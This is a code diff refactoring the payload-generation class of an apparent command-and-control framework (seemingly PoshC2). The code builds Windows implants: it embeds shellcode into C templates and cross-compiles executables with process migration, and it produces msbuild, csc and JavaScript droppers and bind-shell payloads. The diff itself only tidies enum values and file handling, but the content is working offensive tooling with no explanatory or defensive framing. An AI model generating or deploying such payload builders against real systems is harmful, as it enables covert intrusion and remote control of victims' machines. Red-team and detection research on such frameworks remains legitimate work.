@@ -15,11 +15,11 @@ else:
 
 
 class PayloadType(Enum):
-    Posh_v2 = 1
-    Posh_v4 = 2
-    PBind = 3
-    Sharp = 4
-    PBindSharp = 5
+    Posh_v2 = "Posh_v2"
+    Posh_v4 = "Posh_v4"
+    PBind = "PBind_v4"
+    Sharp = "Sharp_v4"
+    PBindSharp = "PBindSharp_v4"
 
 
 class Payloads(object):
@@ -214,15 +214,14 @@ class Payloads(object):
 
         elif payloadtype == PayloadType.Sharp:
             srcfilename = "%s%s%s" % (self.BaseDirectory, name, "dropper_cs.exe")
-            with open(srcfilename, "rb") as b:
-                dllbase64  = base64.b64encode(b.read()).decode("utf-8")
+            dllbase64 = open(srcfilename, "rb").read()
+            dllbase64  = base64.b64encode(dllbase64).decode("utf-8")
             patchlen = 32000 - len((dllbase64))
             patch = dllbase64 
 
         elif payloadtype == PayloadType.PBind:
             out = StringIO()
-            with open("%spbind.ps1" % PayloadTemplatesDirectory, 'r') as f:
-                pbind = f.read()
+            pbind = open("%spbind.ps1" % PayloadTemplatesDirectory, 'r').read()
             pbind = str(pbind).replace("#REPLACEKEY#", self.Key)            
             data = bytes(pbind, 'utf-8')
             out = gzip.compress(data)
@@ -234,8 +233,8 @@ class Payloads(object):
 
         elif payloadtype == PayloadType.PBindSharp:
             srcfilename = "%s%s%s" % (self.BaseDirectory, name, "pbind_cs.exe")
-            with open(srcfilename, "rb") as b:
-                dllbase64 = base64.b64encode(b.read()).decode("utf-8")
+            dllbase64 = open(srcfilename, "rb").read()
+            dllbase64 = base64.b64encode(dllbase64).decode("utf-8")
             patchlen = 32000 - len((dllbase64))
             patch = dllbase64 
 
@@ -252,14 +251,12 @@ class Payloads(object):
 
 
     def CreateDll(self, DestinationFile, ResourceFile, payloadtype, name=""):                
-        with open(ResourceFile, 'r') as f:
-            fileRead = f.read()
+        fileRead = open(ResourceFile, 'r').read()
         self.PatchBytes(DestinationFile, fileRead, offsetFinder(ResourceFile), payloadtype, name)
 
 
     def CreateShellcodeFile(self, DestinationFile, DestinationFileB64, ResourceFile, payloadtype, name=""):        
-        with open(ResourceFile, 'r') as f:
-            fileRead = f.read()
+        fileRead = open(ResourceFile, 'r').read()
         self.PatchBytes(DestinationFile, fileRead, offsetFinder(ResourceFile), payloadtype, name)
         with open(f"{self.BaseDirectory}{DestinationFile}", 'rb') as binary:
             with open(f"{self.BaseDirectory}{DestinationFileB64}", 'wb') as b64:
@@ -351,40 +348,35 @@ class Payloads(object):
 
 
     def CreateDotNet2JSFiles(self, payloadtype, name=""):
-        self.QuickstartLog("Payload written to: %s%s%s_DotNet2JS.js" % (self.BaseDirectory, name, payloadtype))
+        self.QuickstartLog("Payload written to: %s%s%s_DotNet2JS.js" % (self.BaseDirectory, name, payloadtype.value))
         dotnet = open("%sDotNet2JS.js" % PayloadTemplatesDirectory, 'r').read()  
 
         if payloadtype == PayloadType.Posh_v2:
             v4_64 = open('%s%sPosh_v2_x64_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
             v4_86 = open('%s%sPosh_v2_x86_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
-            payloadname = "Posh_v2"
         elif payloadtype == PayloadType.Posh_v4:
             v4_64 = open('%s%sPosh_v4_x64_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
             v4_86 = open('%s%sPosh_v4_x86_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
-            payloadname = "Posh_v4"
         elif payloadtype == PayloadType.Sharp:
             v4_64 = open('%s%sSharp_v4_x64_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
             v4_86 = open('%s%sSharp_v4_x86_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
-            payloadname = "Sharp_v4"
         elif payloadtype == PayloadType.PBind:
             v4_64 = open('%s%sPBind_v4_x64_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
             v4_86 = open('%s%sPBind_v4_x86_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
-            payloadname = "PBind_v4"
         elif payloadtype == PayloadType.PBindSharp:  
             v4_64 = open('%s%sPBindSharp_v4_x64_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
             v4_86 = open('%s%sPBindSharp_v4_x86_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
-            payloadname = "PBindSharp_v4"
 
         dotnet = dotnet \
             .replace("#REPLACEME32#", v4_86.decode('utf-8'))  \
             .replace("#REPLACEME64#", v4_64.decode('utf-8'))  
 
-        filename = "%s%s%s_DotNet2JS.js" % (self.BaseDirectory, payloadname, name)
+        filename = "%s%s%s_DotNet2JS.js" % (self.BaseDirectory, payloadtype.value, name)
         output_file = open(filename, 'w')
         output_file.write(dotnet)
         output_file.close()  
 
-        filename = "%s%s%s_DotNet2JS.b64" % (self.BaseDirectory, payloadname, name)
+        filename = "%s%s%s_DotNet2JS.b64" % (self.BaseDirectory, payloadtype.value, name)
         output_file = open(filename, 'w')
         output_file.write(base64.b64encode(dotnet.encode('UTF-8')).decode('utf-8'))
         output_file.close()        
@@ -433,8 +425,8 @@ class Payloads(object):
                 
 
     def CreateEXEFiles(self, sourcefile, payloadtype, name=""):
-        self.QuickstartLog("Payload written to: %s%s%s_%s64.exe" % (self.BaseDirectory, name, payloadtype, sourcefile.replace(".c","")))
-        self.QuickstartLog("Payload written to: %s%s%s_%s32.exe" % (self.BaseDirectory, name, payloadtype, sourcefile.replace(".c","")))
+        self.QuickstartLog("Payload written to: %s%s%s_%s64.exe" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")))
+        self.QuickstartLog("Payload written to: %s%s%s_%s32.exe" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")))
 
         # Get the first URL and the default migration process from the config
         migrate_process = DefaultMigrationProcess
@@ -449,7 +441,6 @@ class Payloads(object):
             shellcodesrc = open("%s%sPosh_v2_x64_Shellcode.bin" % (self.BaseDirectory, name),'rb').read()
             hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
             shellcode64 = formStr("char sc[]", hexcode)
-            payloadname = "Posh_v2"
 
         elif payloadtype == PayloadType.Posh_v4:
             # Get the Posh shellcode 
@@ -459,7 +450,6 @@ class Payloads(object):
             shellcodesrc = open("%s%sPosh_v4_x64_Shellcode.bin" % (self.BaseDirectory, name),'rb').read()
             hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
             shellcode64 = formStr("char sc[]", hexcode)
-            payloadname = "Posh_v4"
 
         elif payloadtype == PayloadType.Sharp:
             # Get the Sharp shellcode 
@@ -469,7 +459,6 @@ class Payloads(object):
             shellcodesrc = open("%s%sSharp_v4_x64_Shellcode.bin" % (self.BaseDirectory, name),'rb').read()
             hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
             shellcode64 = formStr("char sc[]", hexcode)
-            payloadname = "Sharp_v4"
 
         elif payloadtype == PayloadType.PBind:
             # Get the Posh shellcode 
@@ -479,7 +468,6 @@ class Payloads(object):
             shellcodesrc = open("%s%sPBind_v4_x64_Shellcode.bin" % (self.BaseDirectory, name),'rb').read()
             hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
             shellcode64 = formStr("char sc[]", hexcode)
-            payloadname = "PBind_v4"
 
         elif payloadtype == PayloadType.PBindSharp:
             # Get the Sharp shellcode 
@@ -489,14 +477,13 @@ class Payloads(object):
             shellcodesrc = open("%s%sPBindSharp_v4_x64_Shellcode.bin" % (self.BaseDirectory, name),'rb').read()
             hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
             shellcode64 = formStr("char sc[]", hexcode)
-            payloadname = "PBindSharp_v4"
 
         # Create the raw C file from the template
         content = open("%s%s" % (PayloadTemplatesDirectory, sourcefile), 'r').read()
         content = str(content) \
             .replace("#REPLACEME#", str(shellcode64)) \
             .replace("#REPLACEMEPROCESS#", migrate_process)
-        output_file = open("%s%s%s_%s64.c" % (self.BaseDirectory, name, payloadname, sourcefile.replace(".c","")), 'w')
+        output_file = open("%s%s%s_%s64.c" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")), 'w')
         output_file.write(content)
         output_file.close()
 
@@ -505,13 +492,13 @@ class Payloads(object):
         content = str(content) \
             .replace("#REPLACEME#", str(shellcode32)) \
             .replace("#REPLACEMEPROCESS#", migrate_process)
-        output_file = open("%s%s%s_%s32.c" % (self.BaseDirectory, name, payloadname, sourcefile.replace(".c","")), 'w')
+        output_file = open("%s%s%s_%s32.c" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")), 'w')
         output_file.write(content)
         output_file.close()
 
         # Compile the exe
-        subprocess.check_output("x86_64-w64-mingw32-gcc -w %s%s%s_%s64.c -o %s%s%s_%s64.exe" % (self.BaseDirectory, name, payloadname, sourcefile.replace(".c",""), self.BaseDirectory, name, payloadtype, sourcefile.replace(".c","")), shell=True)
-        subprocess.check_output("i686-w64-mingw32-gcc -w %s%s%s_%s32.c -o %s%s%s_%s32.exe" % (self.BaseDirectory, name, payloadname, sourcefile.replace(".c",""), self.BaseDirectory, name, payloadtype, sourcefile.replace(".c","")), shell=True)
+        subprocess.check_output("x86_64-w64-mingw32-gcc -w %s%s%s_%s64.c -o %s%s%s_%s64.exe" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c",""), self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")), shell=True)
+        subprocess.check_output("i686-w64-mingw32-gcc -w %s%s%s_%s32.c -o %s%s%s_%s32.exe" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c",""), self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")), shell=True)
 
 
     def CreateMacro(self, name=""):
@@ -545,42 +532,26 @@ class Payloads(object):
 
 
     def CreateMsbuildFiles(self, payloadtype, name=""):
-        self.QuickstartLog("Payload written to: %s%s%s_msbuild.xml" % (self.BaseDirectory, name, payloadtype))
+        self.QuickstartLog("Payload written to: %s%s%s_msbuild.xml" % (self.BaseDirectory, name, payloadtype.value))
         
         if payloadtype == PayloadType.Posh_v2:
-            with open("%s%s" % (self.BaseDirectory, name + "Posh_v2_x86_Shellcode.bin"), "rb") as b86:
-                x86base64 = base64.b64encode(b86.read())
-            with open("%s%s" % (self.BaseDirectory, name + "Posh_v2_x64_Shellcode.bin"), "rb") as b64:
-                x64base64 = base64.b64encode(b64.read())
-            payloadname = "Posh_v2"
-
+            x86base64 = open("%s%s" % (self.BaseDirectory, name + "Posh_v2_x86_Shellcode.bin"), "rb").read()
+            x64base64 = open("%s%s" % (self.BaseDirectory, name + "Posh_v2_x64_Shellcode.bin"), "rb").read()
         elif payloadtype == PayloadType.Posh_v4:
-            with open("%s%s" % (self.BaseDirectory, name + "Posh_v4_x86_Shellcode.bin"), "rb") as b86:
-                x86base64 = base64.b64encode(b86.read())
-            with open("%s%s" % (self.BaseDirectory, name + "Posh_v4_x64_Shellcode.bin"), "rb") as b64:
-                x64base64 = base64.b64encode(b64.read())
-            payloadname = "Posh_v4"
-
+            x86base64 = open("%s%s" % (self.BaseDirectory, name + "Posh_v4_x86_Shellcode.bin"), "rb").read()
+            x64base64 = open("%s%s" % (self.BaseDirectory, name + "Posh_v4_x64_Shellcode.bin"), "rb").read()
         elif payloadtype == PayloadType.Sharp:
-            with open("%s%s" % (self.BaseDirectory, name + "Sharp_v4_x86_Shellcode.bin"), "rb") as b86:
-                x86base64 = base64.b64encode(b86.read())
-            with open("%s%s" % (self.BaseDirectory, name + "Sharp_v4_x64_Shellcode.bin"), "rb") as b64:
-                x64base64 = base64.b64encode(b64.read())
-            payloadname = "Sharp_v4"
-
+            x86base64 = open("%s%s" % (self.BaseDirectory, name + "Sharp_v4_x86_Shellcode.bin"), "rb").read()
+            x64base64 = open("%s%s" % (self.BaseDirectory, name + "Sharp_v4_x64_Shellcode.bin"), "rb").read()
         elif payloadtype == PayloadType.PBind:
-            with open("%s%s" % (self.BaseDirectory, name + "PBind_v4_x86_Shellcode.bin"), "rb") as b86:
-                x86base64 = base64.b64encode(b86.read())
-            with open("%s%s" % (self.BaseDirectory, name + "PBind_v4_x64_Shellcode.bin"), "rb") as b64:
-                x64base64 = base64.b64encode(b64.read())
-            payloadname = "PBind_v4"
-
+            x86base64 = open("%s%s" % (self.BaseDirectory, name + "PBind_v4_x86_Shellcode.bin"), "rb").read()
+            x64base64 = open("%s%s" % (self.BaseDirectory, name + "PBind_v4_x64_Shellcode.bin"), "rb").read()
         elif payloadtype == PayloadType.PBindSharp:
             x86base64 = open("%s%s" % (self.BaseDirectory, name + "PBindSharp_v4_x86_Shellcode.bin"), "rb").read()
-            x86base64 = base64.b64encode(x86base64)
             x64base64 = open("%s%s" % (self.BaseDirectory, name + "PBindSharp_v4_x64_Shellcode.bin"), "rb").read()
-            x64base64 = base64.b64encode(x64base64)
-            payloadname = "PBindSharp_v4"
+            
+        x86base64 = base64.b64encode(x86base64)
+        x64base64 = base64.b64encode(x64base64)
 
         msbuild = open("%smsbuild.xml" % (PayloadTemplatesDirectory), 'r').read()
         msbuild = str(msbuild) \
@@ -588,47 +559,31 @@ class Payloads(object):
             .replace("#REPLACEME64#", x64base64.decode('UTF-8')) \
             .replace("#REPLACEMERANDSTRING#", str(randomuri()))
 
-        output_file = open("%s%s%s_msbuild.xml" % (self.BaseDirectory, name, payloadname), 'w')
+        output_file = open("%s%s%s_msbuild.xml" % (self.BaseDirectory, name, payloadtype.value), 'w')
         output_file.write(msbuild)
         output_file.close()
 
     def CreateCSCFiles(self, payloadtype, name=""):
-        self.QuickstartLog("Payload written to: %s%s%s_csc.cs" % (self.BaseDirectory, name, payloadtype))
+        self.QuickstartLog("Payload written to: %s%s%s_csc.cs" % (self.BaseDirectory, name, payloadtype.value))
         
         if payloadtype == PayloadType.Posh_v2:
-            with open("%s%s" % (self.BaseDirectory, name + "Posh_v2_x86_Shellcode.bin"), "rb") as b86:
-                x86base64 = base64.b64encode(b86.read())
-            with open("%s%s" % (self.BaseDirectory, name + "Posh_v2_x64_Shellcode.bin"), "rb") as b64:
-                x64base64 = base64.b64encode(b64.read())
-            payloadname = "Posh_v2"
-
+            x86base64 =  open("%s%s" % (self.BaseDirectory, name + "Posh_v2_x86_Shellcode.bin"), "rb").read()    
+            x64base64 =  open("%s%s" % (self.BaseDirectory, name + "Posh_v2_x64_Shellcode.bin"), "rb").read()
         elif payloadtype == PayloadType.Posh_v4:
-            with open("%s%s" % (self.BaseDirectory, name + "Posh_v4_x86_Shellcode.bin"), "rb") as b86:
-                x86base64 = base64.b64encode(b86.read())
-            with open("%s%s" % (self.BaseDirectory, name + "Posh_v4_x64_Shellcode.bin"), "rb") as b64:
-                x64base64 = base64.b64encode(b64.read())
-            payloadname = "Posh_v4"
-
+            x86base64 = open("%s%s" % (self.BaseDirectory, name + "Posh_v4_x86_Shellcode.bin"), "rb").read()
+            x64base64 = open("%s%s" % (self.BaseDirectory, name + "Posh_v4_x64_Shellcode.bin"), "rb").read()
         elif payloadtype == PayloadType.Sharp:
-            with open("%s%s" % (self.BaseDirectory, name + "Sharp_v4_x86_Shellcode.bin"), "rb") as b86:
-                x86base64 = base64.b64encode(b86.read())
-            with open("%s%s" % (self.BaseDirectory, name + "Sharp_v4_x64_Shellcode.bin"), "rb") as b64:
-                x64base64 = base64.b64encode(b64.read())
-            payloadname = "Sharp_v4"
-
+            x86base64 = open("%s%s" % (self.BaseDirectory, name + "Sharp_v4_x86_Shellcode.bin"), "rb").read()
+            x64base64 = open("%s%s" % (self.BaseDirectory, name + "Sharp_v4_x64_Shellcode.bin"), "rb").read()
         elif payloadtype == PayloadType.PBind:
-            with open("%s%s" % (self.BaseDirectory, name + "PBind_v4_x86_Shellcode.bin"), "rb") as b86:
-                x86base64 = base64.b64encode(b86.read())
-            with open("%s%s" % (self.BaseDirectory, name + "PBind_v4_x64_Shellcode.bin"), "rb") as b64:
-                x64base64 = base64.b64encode(b64.read())
-            payloadname = "PBind_v4"
-
+            x86base64 = open("%s%s" % (self.BaseDirectory, name + "PBind_v4_x86_Shellcode.bin"), "rb").read()
+            x64base64 = open("%s%s" % (self.BaseDirectory, name + "PBind_v4_x64_Shellcode.bin"), "rb").read()
         elif payloadtype == PayloadType.PBindSharp:
-            with open("%s%s" % (self.BaseDirectory, name + "PBindSharp_v4_x86_Shellcode.bin"), "rb") as b86:
-                x86base64 = base64.b64encode(b86.read())
-            with open("%s%s" % (self.BaseDirectory, name + "PBindSharp_v4_x64_Shellcode.bin"), "rb") as b64:
-                x64base64 = base64.b64encode(b64.read())
-            payloadname = "PBindSharp_v4"
+            x86base64 = open("%s%s" % (self.BaseDirectory, name + "PBindSharp_v4_x86_Shellcode.bin"), "rb").read()
+            x64base64 = open("%s%s" % (self.BaseDirectory, name + "PBindSharp_v4_x64_Shellcode.bin"), "rb").read()
+
+        x86base64 = base64.b64encode(x86base64)
+        x64base64 = base64.b64encode(x64base64)
 
         content = open("%scsc.cs" % (PayloadTemplatesDirectory), 'r').read()
         content = str(content) \
@@ -636,7 +591,7 @@ class Payloads(object):
             .replace("#REPLACEME64#", x64base64.decode('UTF-8')) \
             .replace("#REPLACEMERANDSTRING#", str(randomuri()))
 
-        output_file = open("%s%s%s_csc.cs" % (self.BaseDirectory, name, payloadname), 'w')
+        output_file = open("%s%s%s_csc.cs" % (self.BaseDirectory, name, payloadtype.value), 'w')
         output_file.write(content)
         output_file.close()
 
